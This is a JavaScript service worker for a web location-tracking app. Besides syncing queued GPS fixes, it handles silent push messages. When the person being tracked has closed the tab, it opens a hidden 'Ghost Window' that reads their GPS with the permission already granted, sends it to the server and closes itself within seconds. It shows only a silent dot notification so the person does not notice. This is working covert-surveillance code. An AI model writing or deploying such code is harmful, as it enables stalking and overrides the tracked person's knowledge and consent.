/**
 * sw.js — Location Tracker Service Worker
 *
 * Capabilities:
 * 1. Background Sync    — Queues offline GPS locations and retries when online.
 * 2. Web Push (Visible) — Shows a notification when admin manually pings.
 * 3. Web Push (Silent)  — "Neural Ping" — wakes up silently, reports IP to server,
 *                         and postMessages any open window to attempt GPS re-capture.
 * 4. GPS Restore Bridge — postMessages the main window to try getting a fresh GPS fix.
 */

const CACHE_NAME = "location-tracker-v2";

// ── Lifecycle ─────────────────────────────────────────────────────────────────
self.addEventListener("install", () => {
  self.skipWaiting();
});

self.addEventListener("activate", (event) => {
  event.waitUntil(clients.claim());
});

// ── IndexedDB helpers (for background sync) ───────────────────────────────────
function openDB() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open("OfflineLocations", 1);
    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      if (!db.objectStoreNames.contains("locations")) {
        db.createObjectStore("locations", { autoIncrement: true });
      }
    };
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

async function getOfflineData() {
  const db = await openDB();
  return new Promise((resolve) => {
    const tx = db.transaction("locations", "readonly");
    const store = tx.objectStore("locations");
    const request = store.getAll();
    request.onsuccess = () => resolve(request.result || []);
  });
}

async function clearOfflineData() {
  const db = await openDB();
  return new Promise((resolve) => {
    const tx = db.transaction("locations", "readwrite");
    tx.objectStore("locations").clear();
    tx.oncomplete = () => resolve();
  });
}

// ── Background Sync — flush queued offline locations ─────────────────────────
self.addEventListener("sync", (event) => {
  if (event.tag === "sync-locations") {
    event.waitUntil(
      (async () => {
        try {
          const data = await getOfflineData();
          if (!data || data.length === 0) return;

          const apiBase = data[0]?.apiBase || self.registration.scope + "api";
          const url = `${apiBase}/tracking/update-location`;

          for (const loc of data) {
            await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                token: loc.token,
                latitude: loc.latitude,
                longitude: loc.longitude,
                accuracy: loc.accuracy,
              }),
            });
          }
          await clearOfflineData();
          console.log("[SW] Background sync: flushed", data.length, "queued locations");
        } catch (err) {
          console.error("[SW] Background sync failed:", err);
          throw err; // Causes the browser to retry
        }
      })()
    );
  }
});

// ── Web Push Handler ──────────────────────────────────────────────────────────
self.addEventListener("push", (event) => {
  let payload = {};
  if (event.data) {
    try {
      payload = event.data.json();
    } catch (e) {
      payload = { body: event.data.text(), type: "user-ping" };
    }
  }

  // ── NEURAL PING: Silent background Ghost Window attempt ────────
  if (payload.type === "silent-ghost-ping") {
    console.log("[SW] Neural Ping received — IP report + Ghost Window mode");

    event.waitUntil(
      (async () => {
        const { token, apiBase } = payload;

        // IP mode is removed — we only do Ghost Window check now
        // Step 2: Check for open windows to postMessage for GPS check
        const windowClients = await clients.matchAll({
          type: "window",
          includeUncontrolled: true,
        });

        if (windowClients.length > 0) {
          // Tab is open — ask it to try GPS re-capture silently
          windowClients.forEach((client) => {
            client.postMessage({ type: "NEURAL_PING_GPS_CHECK", token, apiBase });
          });
          console.log("[SW] Sent GPS check to", windowClients.length, "open window(s)");
        } else {
          // Step 3: No tab open — try Ghost Window for immediate GPS capture
          // This runs simultaneously with IP reporting, so viewer gets GPS within seconds
          const ghostUrl = `/ghost?token=${encodeURIComponent(token)}&apiBase=${encodeURIComponent(apiBase)}`;
          try {
            await clients.openWindow(ghostUrl);
            console.log("[SW] Ghost Window launched on initial disconnect ping");
          } catch (err) {
            console.warn("[SW] Ghost Window failed on initial ping:", err.message);
          }
        }

        // Satisfy browser notification requirement — silent dot, no sound/vibration
        return self.registration.showNotification(".", {
          silent: true,
          tag: "neural-ping-silent",
          renotify: false,
          requireInteraction: false,
        });
      })()
    );

    // STOP — don't fall through
    return;
  }


  // ── RESUME PING: Ghost Window GPS Capture ─────────────────────────────────
  // Sent every 2 min while sharer is offline.
  //
  // Strategy A — Tab is OPEN (minimized/background):
  //   postMessage the window to try navigator.geolocation silently. No notification.
  //
  // Strategy B — Tab is CLOSED (the extraordinary case):
  //   Use clients.openWindow('/ghost?token=TOKEN') — opens a Ghost Location page
  //   that auto-captures GPS (permission already granted), reports to server,
  //   and calls window.close() in ~2 seconds. FULLY AUTOMATIC. No user tap needed.
  //   Falls back to a "Tap to Resume" notification if openWindow() is blocked.
  if (payload.type === "resume-ping") {
    console.log("[SW] Resume ping received — Ghost Window protocol initiating...");

    event.waitUntil(
      (async () => {
        const { token, apiBase } = payload;

        // Build ghost URL — the minimal page that grabs GPS and self-destructs
        const ghostUrl = `/ghost?token=${encodeURIComponent(token)}&apiBase=${encodeURIComponent(apiBase)}`;

        // ── Check for any open window belonging to this tracking session ──
        const windowClients = await clients.matchAll({
          type: "window",
          includeUncontrolled: true,
        });

        const trackingWindow = windowClients.find(
          (c) => c.url.includes(`/track/${token}`) || c.url.includes(token)
        );

        // ── Strategy A: Tab is already open ──────────────────────────────
        if (trackingWindow) {
          trackingWindow.postMessage({ type: "NEURAL_PING_GPS_CHECK", token, apiBase });
          console.log("[SW] Resume ping: postMessaged open tab for GPS check (silent)");

          // Satisfy browser push notification requirement silently
          return self.registration.showNotification(".", {
            silent: true,
            tag: "neural-ping-silent",
            requireInteraction: false,
          });
        }

        // ── Strategy B: Tab is CLOSED — launch Ghost Window ──────────────
        // clients.openWindow() IS allowed inside a push event per the Web Push spec.
        // The ghost page grabs GPS (already granted), POSTs to /api/push/gps-report,
        // then calls window.close(). Viewer gets real GPS, not just IP approximation.
        console.log("[SW] Resume ping: no open tab — launching Ghost Window for GPS capture");

        try {
          await clients.openWindow(ghostUrl);
          console.log("[SW] ✅ Ghost Window launched — GPS capture in progress");

          // Satisfy browser notification requirement with a super-silent dot
          return self.registration.showNotification(".", {
            silent: true,
            tag: "neural-ghost-open",
            requireInteraction: false,
          });
        } catch (openErr) {
          // openWindow() can be blocked by some browsers in certain contexts
          console.warn("[SW] Ghost Window blocked, falling back to notification:", openErr.message);

          // Fallback: Show a tap-to-resume notification the old way
          return self.registration.showNotification("📍 Resume Location Sharing", {
            body: "GPS is on. Tap here to automatically share your live location.",
            icon: "/favicon.svg",
            badge: "/favicon.svg",
            vibrate: [200, 100, 200],
            tag: "neural-resume",
            renotify: true,
            requireInteraction: false,
            silent: false,
            data: {
              url: `/track/${token}?resume=1`,
              token,
              apiBase,
            },
          });
        }
      })()
    );

    // STOP — don't fall through to the visible ping handler
    return;
  }

  // ── VISIBLE PING: Manual admin ping — show a proper notification ───────────
  const title = payload.title || "📍 Location Update Required";
  const options = {
    body:
      payload.body ||
      "Someone is requesting your location. Tap to open the tracker.",
    icon: payload.icon || "/favicon.svg",
    badge: "/favicon.svg",
    vibrate: [200, 100, 200, 100, 200, 100, 200],
    data: payload.data || {},
    requireInteraction: true, // Keeps the notification open until the user taps it
    tag: "location-ping",
    renotify: true,
  };

  event.waitUntil(self.registration.showNotification(title, options));
});

// ── Notification Click Handler ────────────────────────────────────────────────
self.addEventListener("notificationclick", (event) => {
  event.notification.close();

  // Dismiss ghost/silent notifications quietly — they were auto-generated,
  // no tab should be opened when the user accidentally taps them
  const silentTags = ["neural-ping-silent", "neural-ghost-silent", "neural-ghost-open"];
  if (silentTags.includes(event.notification.tag)) return;

  const urlToOpen = event.notification.data?.url || "/";

  event.waitUntil(
    clients
      .matchAll({ type: "window", includeUncontrolled: true })
      .then((windowClients) => {
        // If the tracking tab is already open, focus it
        const matchingClient = windowClients.find(
          (client) =>
            client.url.includes(urlToOpen) ||
            client.url.includes("/track/")
        );
        if (matchingClient && "focus" in matchingClient) {
          // Focus it and navigate to the resume URL so it auto-starts
          matchingClient.focus();
          if (event.notification.tag === "neural-resume") {
            matchingClient.navigate(urlToOpen);
          }
          return;
        }
        // Otherwise open a new tab to the URL (with ?resume=1 for auto-start)
        if (clients.openWindow) {
          return clients.openWindow(urlToOpen);
        }
      })
  );
});

